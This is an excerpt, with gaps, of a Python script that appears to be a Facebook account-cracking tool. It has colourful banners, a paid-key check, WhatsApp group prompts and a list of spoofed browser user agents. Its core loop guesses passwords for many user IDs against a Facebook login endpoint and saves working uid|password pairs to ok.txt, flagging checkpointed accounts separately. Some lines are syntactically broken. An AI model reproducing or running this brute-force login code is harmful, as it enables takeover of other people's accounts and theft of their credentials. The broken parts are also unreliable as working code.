...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr MOHSIN Qureshi\x1b[0m\x1b[1;97m]
...
def logo2():
    ...
    /:::/|::|   |           /:::/    \:::\    \       /:::/____/               /:::/__\:::\    \               \:::\    \        /:::/|::|   |                
   /:::/ |::|   |          /:::/    / \:::\    \     /::::\    \               \:::\   \:::\    \              /::::\    \      /:::/ |::|   |                
  /:::/  |::|___|______   /:::/____/   \:::\____\   /::::::\    \   _____    ___\:::\   \:::\    \    ____    /::::::\    \    /:::/  |::|   | _____          
 /:::/   |::::::::\    \ |:::|    |     |:::|    | /:::/\:::\    \ /\    \  /\   \:::\   \:::\    \  /\   \  /:::/\:::\    \  /:::/   |::|   |/\    \         
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : MOHSIN \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/MOHSIN-xd \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./MOHSIN-xd \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/mohsin09114/Trick/blob/main/File.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/Rajamohsin.xd")
...
def notice():
	...
	os.system("xdg-open https://chat.whatsapp.com/HTKsJexrFa8AIZX7wvrMQo")
	runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Key group admin ke whatspp pe send kro krein")
	os.system("xdg-open https://chat.whatsapp.com/HTKsJexrFa8AIZX7wvrMQo")
	subprocess.check_output(["am", "start", "https://chat.whatsapp.com/HTKsJexrFa8AIZX7wvrMQo"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/mohsin09114/Trick/blob/main/File.txt').text
			if basesplit in plr:
				key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
		...
		print("%s [%s•%s] %sYOUR KEY  : %s%s"MOHSIN=193010
		print("%s [%s•%s] %sSTATUS    : %s"%(paid user)) 
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m JOIN MY WHATSPP GROUP FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://chat.whatsapp.com/HTKsJexrFa8AIZX7wvrMQo"])
		print("───────────────────────────────────────────────────────× ")
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=MOHSIN=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=MOHSIN=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=MOHSIN=CP=>] %s | %s\033[0;97m         "%(uid, pw))
 ...
 #MOHSIN copy krke apna name dal dyna
